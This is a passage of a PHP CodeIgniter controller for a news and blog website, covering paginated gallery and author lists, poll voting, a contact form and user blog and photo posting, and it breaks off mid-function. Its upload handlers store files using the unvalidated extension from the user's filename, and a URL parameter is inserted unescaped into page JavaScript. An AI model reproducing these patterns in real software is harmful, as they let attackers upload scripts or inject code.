        $function = "filter_news('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_news('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_news('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '&rsaquo;';
        $config['next_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="active"><a>';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_news(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);

        $this->db->where('status', 'published');
        $this->db->order_by('photo_id','desc');
        $page_data['photos'] = $this->db->get('photo', $config['per_page'], $para1)->result_array();
        $page_data['count'] = $config['total_rows'];

        $this->load->view('front/photo_gallery/ajax_list', $page_data);
    }

    function video_gallery($para1 = '') {
        $page_data['asset_page'] = 'video_gallery';
        $page_data['page_name'] = 'video_gallery';
        $page_data['type'] = $para1;
        $page_data['page_title'] = translate('video_gallery');

        $this->load->view('front/index', $page_data);
    }

    function get_video_list($para1 = '') {
        $page_data['source'] = $para1;
        $this->load->view('front/video_gallery/video_list', $page_data);
    }

    function ajax_video_list($para1 = '') {
        $this->load->library('Ajax_pagination');
        $source = $this->input->post('source');
        if ($source !== 'all') {
            $this->db->where('from', $source);
        }
        // pagination
        $this->db->where('status', 'published');
        $config['total_rows'] = $this->db->count_all_results('video');
        $config['base_url'] = base_url() . 'index.php?home/listed/';
        $config['per_page'] = 9;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;

        $function = "filter_news('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_news('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_news('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_news('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '&rsaquo;';
        $config['next_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="active"><a>';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_news(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);

        if ($source !== 'all') {
            $this->db->where('from', $source);
        }
        $this->db->where('status', 'published');
        $page_data['videos'] = $this->db->get('video', $config['per_page'], $para1)->result_array();
        $page_data['count'] = $config['total_rows'];

        $this->load->view('front/video_gallery/ajax_list', $page_data);
    }

    function reporters() {
        $page_data['asset_page'] = 'reporters';
        $page_data['page_name'] = 'reporters';
        $page_data['page_title'] = translate('reporters');

        $this->load->view('front/index', $page_data);
    }

    function get_reporters_list() {
        $this->load->view('front/reporters/reporters_list');
    }

    function ajax_reporters_list($para1 = '') {
        $this->load->library('Ajax_pagination');

        // pagination
        $config['total_rows'] = $this->db->count_all_results('news_reporter');
        $config['base_url'] = base_url() . 'index.php?home/listed/';
        $config['per_page'] = 12;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;

        $function = "filter_news('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_news('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_news('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_news('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '&rsaquo;';
        $config['next_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="active"><a>';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_news(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);

        $page_data['reporters'] = $this->db->get('news_reporter', $config['per_page'], $para1)->result_array();
        $page_data['count'] = $config['total_rows'];

        $this->load->view('front/reporters/ajax_list', $page_data);
    }

    function bloggers() {
        $page_data['asset_page'] = 'bloggers';
        $page_data['page_name'] = 'bloggers';
        $page_data['page_title'] = translate('bloggers');

        $this->load->view('front/index', $page_data);
    }

    function get_bloggers_list() {
        $this->load->view('front/bloggers/bloggers_list');
    }

    function ajax_bloggers_list($para1 = '') {
        $this->load->library('Ajax_pagination');

        // pagination
        $config['total_rows'] = $this->db->where('is_blogger', 'yes')->count_all_results('user');
        $config['base_url'] = base_url() . 'index.php?home/listed/';
        $config['per_page'] = 12;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;

        $function = "filter_news('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_news('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_news('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_news('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '&rsaquo;';
        $config['next_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="active"><a>';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_news(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);

        $page_data['bloggers'] = $this->db->where('is_blogger', 'yes')->get('user', $config['per_page'], $para1)->result_array();
        $page_data['count'] = $config['total_rows'];

        $this->load->view('front/bloggers/ajax_list', $page_data);
    }

    /* FUNCTION: poll */

    function poll($para1 = '', $para2 = '', $para3 = '') {
        if ($para1 == 'vote') {
            $option_new = array();
            $option = json_decode($this->db->get_where('poll', array('poll_id' => $para2))->row()->options, true);
            foreach ($option as $i => $row) {
                if ($row['index'] == $para3) {
                    $option_new[] = array('index' => $row['index'], 'title' => $row['title'], 'count' => $row['count'] + 1);
                } else {
                    $option_new[] = array('index' => $row['index'], 'title' => $row['title'], 'count' => $row['count']);
                }
            }
            $data['options'] = json_encode($option_new);
            $this->db->where('poll_id', $para2);
            $this->db->update('poll', $data);
        }if ($para1 == 'res') {
            $data['option'] = json_decode($this->db->get_where('poll', array('poll_id' => $para2))->row()->options, true);
            $this->load->view('front/components/poll/poll_res', $data);
        }
    }

    /* FUNCTION: Legal pages load - terms & conditions / privacy policy */

    function legal($type = "") {
        $page_data['type'] = $type;
        $page_data['page_name'] = "others/legal";
        $page_data['asset_page'] = "legal";
        $page_data['page_title'] = translate($type);
        $this->load->view('front/index', $page_data);
    }

    function rss_links($para1 = "") {

        $page_data['page_name'] = "others/rss_link";
        $page_data['asset_page'] = "legal";
        $page_data['page_title'] = translate('rss_links');
        $this->load->view('front/index', $page_data);
    }

    function contact($para1 = '', $para2 = '') {
        if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
            $this->load->library('recaptcha');
        }
        $this->load->library('form_validation');
        if ($para1 == 'send') {
            $safe = 'yes';
            $char = '';
            foreach ($_POST as $row) {
                if (preg_match('/[\'^":()}{#~><>|=+¬]/', $row, $match)) {
                    $safe = 'no';
                    $char = $match[0];
                }
            }
            $this->form_validation->set_rules('name', 'Name', 'required');
            $this->form_validation->set_rules('subject', 'Subject', 'required');
            $this->form_validation->set_rules('message', 'Message', 'required');
            $this->form_validation->set_rules('email', 'Email', 'required');

            if ($this->form_validation->run() == FALSE) {
                echo validation_errors();
            } else {
                if ($safe == 'yes') {
                    if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
                        $captcha_answer = $this->input->post('g-recaptcha-response');
                        $response = $this->recaptcha->verifyResponse($captcha_answer);
                        if ($response['success']) {
                            $data['name'] = $this->input->post('name', true);
                            $data['subject'] = $this->input->post('subject');
                            $data['email'] = $this->input->post('email');
                            $data['message'] = $this->security->xss_clean(($this->input->post('message')));
                            $data['view'] = 'no';
                            $data['timestamp'] = time();
                            $this->db->insert('contact_message', $data);
                            echo 'sent';
                        } else {
                            echo 'captcha_incorrect';
                        }
                    } else {
                        $data['name'] = $this->input->post('name', true);
                        $data['subject'] = $this->input->post('subject');
                        $data['email'] = $this->input->post('email');
                        $data['message'] = $this->security->xss_clean(($this->input->post('message')));
                        $data['view'] = 'no';
                        $data['timestamp'] = time();
                        $this->db->insert('contact_message', $data);
                        echo 'sent';
                    }
                } else {
                    echo 'Disallowed charecter : " ' . $char . ' " in the POST';
                }
            }
        } else {
            if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
                $page_data['recaptcha_html'] = $this->recaptcha->render();
            }
            $page_data['asset_page'] = 'contact';
            $page_data['page_name'] = 'contact';
            $page_data['page_title'] = translate('contact');
            $this->load->view('front/index', $page_data);
        }
    }

    function blog($para1 = '', $para2 = '') {
        if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
            $this->load->library('recaptcha');
        }
        if ($para1 == "") {
            $page_data['asset_page'] = 'blog';
            $page_data['page_name'] = 'blog';
            $page_data['page_title'] = translate('blog');
            $this->load->view('front/index', $page_data);
        }
        elseif ($para1 == "list") {
            $page_data['asset_page'] = 'blog';
            $page_data['page_name'] = 'blog_list';
            $page_data['page_title'] = translate('blog');
            $this->load->view('front/index', $page_data);
        }
    }

    function get_blog_list() {
        $this->load->view('front/blog_list/blog_list');
    }

    function blog_detail($para1 = '') {
        if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
            $this->load->library('recaptcha');
        }
        if ($para1) {
            $data = $this->db->get_where('blog', array('blog_id' => $para1, 'status' => 'published', 'hide_status' => 'false'));
            //$page_data['blog_detail'] = $this->db->get_where('blog', array('blog_id' => $para1, 'status' => 'published', 'hide_status' => 'false'))->row();
            if ($data->num_rows() == 1) {
                $page_data['blog_detail'] = $data->row();
                $view_count = $this->db->get_where('blog', array('blog_id' => $para1))->row()->view_count;
                $view_count++;
                $this->db->where('blog_id', $para1);
                $this->db->update('blog', array('view_count' => $view_count));

                $page_data['asset_page'] = 'blog_detail';
                $page_data['page_name'] = 'blog_detail';
                $page_data['page_title'] = translate('blog');
                $this->load->view('front/index', $page_data);
            } else {
                redirect(base_url() . 'home');
            }

        }
    }

    function blog_photo_gallery() {
        $page_data['asset_page'] = 'blog_photo_gallery';
        $page_data['page_name'] = 'blog_photo_gallery';
        $page_data['page_title'] = translate('blog_photo_gallery');
        $this->load->view('front/index', $page_data);
    }

    function get_blog_photo_list() {
        $this->load->view('front/blog_photo_gallery/blog_photo_list');
    }

    function ajax_blog_photo_list($para1 = '') {
        $this->load->library('Ajax_pagination');

        // pagination
        $this->db->where('status', 'published');
        $this->db->where('hide_status', 'false');
        $config['total_rows'] = $this->db->count_all_results('blog_photo');
        //$config['base_url'] = base_url() . 'index.php?home/listed/';
        $config['per_page'] = 12;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;

        $function = "filter_news('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_news('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_news('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_news('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '&rsaquo;';
        $config['next_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="active"><a>';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_news(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);

        $this->db->order_by('blog_photo_id', 'desc');
        $this->db->where('status', 'published');
        $this->db->where('hide_status', 'false');
        $page_data['blog_photos'] = $this->db->get('blog_photo', $config['per_page'], $para1)->result_array();
        $page_data['count'] = $config['total_rows'];

        $this->load->view('front/blog_photo_gallery/ajax_list', $page_data);
    }

    function profile_ajax_blog_list($para1 = '') {
        $user_id = $this->session->userdata('user_id');
        $this->load->library('Ajax_pagination');

        // pagination
        $config['total_rows'] = $this->db->order_by('blog_id', 'DESC')->where('blog_uploader_id', $user_id)->where('blog_uploader_type','user')->count_all_results('blog');
        //$config['base_url'] = base_url() . 'index.php?home/listed/';
        $config['per_page'] = 10;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;

        $function = "filter_news('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_news('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_news('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_news('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '&rsaquo;';
        $config['next_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="active"><a>';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_news(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);
        $page_data['cur_page'] = $para1;


        $page_data['blog_list'] = $this->db->order_by('blog_id', 'DESC')->where('blog_uploader_id', $user_id)->where('blog_uploader_type','user')->get('blog', $config['per_page'], $para1)->result_array();
        $page_data['count'] = $config['total_rows'];

        $this->load->view('front/user/profile/blog_list/ajax_blog_table', $page_data);
    }

    function profile_ajax_photo_list($para1 = '') {
        $user_id = $this->session->userdata('user_id');
        $this->load->library('Ajax_pagination');

        // pagination
        $config['total_rows'] = $this->db->order_by('blog_photo_id', 'DESC')->where('blog_photo_uploader_id', $user_id)->where('blog_photo_uploader_type', 'user')->count_all_results('blog_photo');
        //$config['base_url'] = base_url() . 'index.php?home/listed/';
        $config['per_page'] = 10;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;

        $function = "filter_news('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_news('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_news('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_news('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '&rsaquo;';
        $config['next_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="active"><a>';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_news(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);
        $page_data['cur_page'] = $para1;
        $page_data['blog_photo_list'] = $this->db->order_by('blog_photo_id', 'DESC')->where('blog_photo_uploader_id', $user_id)->where('blog_photo_uploader_type', 'user')->get('blog_photo', $config['per_page'], $para1)->result_array();
        $page_data['count'] = $config['total_rows'];

        $this->load->view('front/user/profile/blog_list/ajax_photo_table', $page_data);
    }

    function profile_ajax_video_list($para1 = '') {
        $user_id = $this->session->userdata('user_id');
        $this->load->library('Ajax_pagination');
        // pagination
        $config['total_rows'] = $this->db->order_by('blog_video_id', 'DESC')->where('blog_video_uploader_id', $user_id)->where('blog_video_uploader_type', 'user')->count_all_results('blog_video');
        //$config['base_url'] = base_url() . 'index.php?home/listed/';
        $config['per_page'] = 10;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;

        $function = "filter_news('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_news('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_news('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_news('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '&rsaquo;';
        $config['next_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="active"><a>';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_news(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);
        $page_data['cur_page'] = $para1;
        $page_data['blog_video_list'] = $this->db->order_by('blog_video_id', 'DESC')->where('blog_video_uploader_id', $user_id)->where('blog_video_uploader_type', 'user')->get('blog_video', $config['per_page'], $para1)->result_array();
        $page_data['count'] = $config['total_rows'];

        $this->load->view('front/user/profile/blog_list/ajax_video_table', $page_data);
    }

    function blog_photo_description($para1 = '') {
        $page_data['blog_photo_id'] = $para1;
        $blog_photo_data = $this->db->get_where('blog_photo', array('blog_photo_id' => $para1));
        $page_data['blog_photo_description'] = $blog_photo_data->result_array();

		$view_count = $this->db->get_where('blog_photo', array('blog_photo_id' => $para1))->row()->view_count;
		$view_count++;
		$this->db->where('blog_photo_id', $para1);
		$this->db->update('blog_photo', array('view_count' => $view_count));

        $page_data['asset_page'] = 'blog_photo_description';
        $page_data['page_name'] = 'blog_photo_description';
        $page_data['page_title'] = $blog_photo_data->row()->title;
        $this->load->view('front/index', $page_data);
    }

    function blog_video_gallery($para1 = '') {
        $page_data['asset_page'] = 'blog_video_gallery';
        $page_data['page_name'] = 'blog_video_gallery';
        $page_data['type'] = $para1;
        $page_data['page_title'] = translate('blog_video_gallery');

        $this->load->view('front/index', $page_data);
    }

    function get_blog_video_list($para1 = '') {
        $page_data['source'] = $para1;
        $this->load->view('front/blog_video_gallery/video_list', $page_data);
    }

    function ajax_blog_video_list($para1 = '') {
        $this->load->library('Ajax_pagination');
        $source = $this->input->post('source');
        if ($source !== 'all') {
            $this->db->where('from', $source);
        }
        // pagination
        $this->db->where('status', 'published');
        $this->db->where('hide_status', 'false');
        $config['total_rows'] = $this->db->count_all_results('blog_video');
        $config['base_url'] = base_url() . 'index.php?home/listed/';
        $config['per_page'] = 9;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;

        $function = "filter_news('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_news('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_news('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_news('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '&rsaquo;';
        $config['next_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="active"><a>';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_news(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);

        if ($source !== 'all') {
            $this->db->where('from', $source);
        }
        $this->db->where('status', 'published');
        $this->db->where('hide_status', 'false');
        $page_data['blog_videos'] = $this->db->order_by('blog_video_id', 'DESC')->get('blog_video', $config['per_page'], $para1)->result_array();
        $page_data['count'] = $config['total_rows'];

        $this->load->view('front/blog_video_gallery/ajax_list', $page_data);
    }

    function blog_video_description($para1 = '') {
        $page_data['blog_video_id'] = $para1;
        $blog_video_data = $this->db->get_where('blog_video', array('blog_video_id' => $para1, 'status' => 'published'));
        $page_data['blog_video_description'] = $blog_video_data->result_array();

		$view_count = $this->db->get_where('blog_video', array('blog_video_id' => $para1))->row()->view_count;
		$view_count++;
		$this->db->where('blog_video_id', $para1);
		$this->db->update('blog_video', array('view_count' => $view_count));

        $page_data['asset_page'] = 'blog_video_description';
        $page_data['page_name'] = 'blog_video_description';
        $page_data['page_title'] = $blog_video_data->row()->title;
        $this->load->view('front/index', $page_data);
    }

    /* FUNCTION: USER profile */

    function profile($para1 = "", $para2 = "", $para3 = "", $para4 = "") {
        if ($this->session->userdata('user_login') !== "yes") {
            redirect(base_url() . 'home', 'refresh');
        }
        if ($para1 == "profile") {
            $user_id = $this->session->userdata('user_id');
            $page_data['user_info'] = $this->db->get_where('user', array('user_id' => $user_id))->result_array();
            $this->load->view('front/user/profile/profile', $page_data);
        }
        elseif ($para1 == "read_later") {
            $this->load->view('front/user/profile/read_later');
        }
        elseif ($para1 == "update_info") {
            $user_id = $this->session->userdata('user_id');
            $page_data['user_info'] = $this->db->get_where('user', array('user_id' => $user_id))->result_array();
            $this->load->view('front/user/profile/update_profile', $page_data);
        }
        elseif ($para1 == "ad_option") {
            $user_id = $this->session->userdata('user_id');
            $page_data['ad_id'] = $para2;
            $page_data['ad_details'] = $this->db->get_where('advertisement',array('advertisement_id' => $para2))->row();
            //$page_data['pages'] = $this->db->get('ad_page')->result_array();
            $this->load->view('front/user/profile/ad_option', $page_data);
        }
        elseif ($para1 == "pay_for_post") {
            if ($para2 =='') {
                $page_data['package_id']   = $para2;
                $this->load->view('front/user/profile/pay_for_post', $page_data);
            }
            elseif ($para2 == 'do_add') {
                $this->form_validation->set_rules('title', translate('title'), 'required');
                $this->form_validation->set_rules('summary', translate('summary'), 'required');
                $this->form_validation->set_rules('description', translate('description'), 'required');
                $this->form_validation->set_rules('blog_category', translate('blog_category'), 'required');
                $this->form_validation->set_rules('blog_sub_category', translate('blog_sub_category'), 'required');

                if ($this->form_validation->run() == FALSE) {
                    echo "<br>".validation_errors();
                } else {
                    $user_id = $this->session->userdata('user_id');

                    $data['title'] = $this->input->post('title');
                    $data['summary'] = $this->input->post('summary');
                    $data['description'] = $this->input->post('description');
                    $data['blog_category_id'] = $this->input->post('blog_category');
                    $data['blog_sub_category_id'] = $this->input->post('blog_sub_category');
                    $data['status'] = 'published';
                    $data['hide_status'] = 'false';
                    $data['date'] = strtotime($this->input->post('date'));
                    $data['timestamp'] = time();
                    $data['tag'] = $this->input->post('tag');
                    $data['blog_uploader_type'] = 'user';
                    $data['blog_uploader_id'] = $user_id;
                    $data['edited_by'] = '[]';
                    $data['img_features'] = '[]';

                    $this->db->insert('blog', $data);
                    $id = $this->db->insert_id();

                    if(!demo()){
                        $img_features = array();
                        foreach ($_FILES['nimg']['name'] as $i => $row) {
                            if ($_FILES['nimg']['name'][$i] !== '') {
                                $ib = $i + 1;
                                $path = $_FILES['nimg']['name'][$i];
                                $ext = pathinfo($path, PATHINFO_EXTENSION);
                                $img = 'blog_' . $id . '_' . $ib . '.' . $ext;
                                $img_thumb = 'blog_' . $id . '_' . $ib . '_thumb.' . $ext;
                                $img_features[] = array('index' => $i, 'img' => $img, 'thumb' => $img_thumb);
                                move_uploaded_file($_FILES['nimg']['tmp_name'][$i], 'uploads/' . 'blog' . '_image/' . 'blog' . '_' . $id . '_' . $ib .'.'. $ext);
                                $this->Crud_model->img_thumb("blog", $id . '_' . $ib, $ext);
                            }
                        }

                        $data1['img_features'] = json_encode($img_features);
                        $this->db->where('blog_id', $id);
                        $this->db->update('blog', $data1);
                    }

                    // Subtracting Blog Post Amount
                    $remaining_post = $this->Crud_model->get_type_name_by_id('user', $user_id, 'post_amount');
                    $post_amount = $remaining_post - 1;
                    $this->db->where('user_id', $user_id);
                    $this->db->update('user', array('post_amount' => $post_amount));

                    recache();
                    echo "done";
                }
            }
            elseif ($para2 == 'sub_by_cat') {
                echo $this->Crud_model->select_html('blog_sub_category', 'blog_sub_category', 'name', 'add', 'custom-input-field-1', '', 'parent_category_id', $para3, '');
            }
        }
        elseif ($para1 == "pay_for_image_post") {
            if ($para2 == 'do_add') {
                $this->form_validation->set_rules('title', translate('title'), 'required');
                $this->form_validation->set_rules('description', translate('description'), 'required');
                foreach ($_FILES['nimg']['name'] as $i => $row) {
                    if (empty($_FILES['nimg']['name'][$i])) {
                        $this->form_validation->set_rules('nimg', translate('image'), 'required');
                        break;
                    }
                }
                if ($this->form_validation->run() == FALSE) {
                    echo "<br>".validation_errors();
                } else {
                    $user_id = $this->session->userdata('user_id');

                    $data['title'] = $this->input->post('title');
                    $data['description'] = $this->input->post('description');
                    $data['status'] = 'published';
                    $data['hide_status'] = 'false';
                    $data['timestamp'] = time();
                    $data['blog_photo_uploader_type'] = 'user';
                    $data['blog_photo_uploader_id'] = $user_id;
                    $data['edited_by'] = '[]';
                    $data['img_features'] = '[]';

                    $this->db->insert('blog_photo', $data);
                    $id = $this->db->insert_id();
                    if(!demo()){
                        $img_features = array();
                        foreach ($_FILES['nimg']['name'] as $i => $row) {
                            if ($_FILES['nimg']['name'][$i] !== '') {
                                $ib = $i + 1;
                                $path = $_FILES['nimg']['name'][$i];
                                $ext = pathinfo($path, PATHINFO_EXTENSION);
                                $img = 'blog_photo_' . $id . '_' . $ib . '.' . $ext;
                                $img_thumb = 'blog_photo_' . $id . '_' . $ib . '_thumb.' . $ext;
                                $img_features[] = array('index' => $i, 'img' => $img, 'thumb' => $img_thumb);
                            }
                        }
                        $this->Crud_model->file_up("nimg", "blog_photo", $id, 'multi');
                        $data1['img_features'] = json_encode($img_features);
                        $this->db->where('blog_photo_id', $id);
                        $this->db->update('blog_photo', $data1);
                    }
                    recache();

                    // Subtracting Blog Post Amount
                    $remaining_image = $this->Crud_model->get_type_name_by_id('user', $user_id, 'photo_amount');
                    $photo_amount = $remaining_image - 1;
                    $this->db->where('user_id', $user_id);
                    $this->db->update('user', array('photo_amount' => $photo_amount));

                    recache();
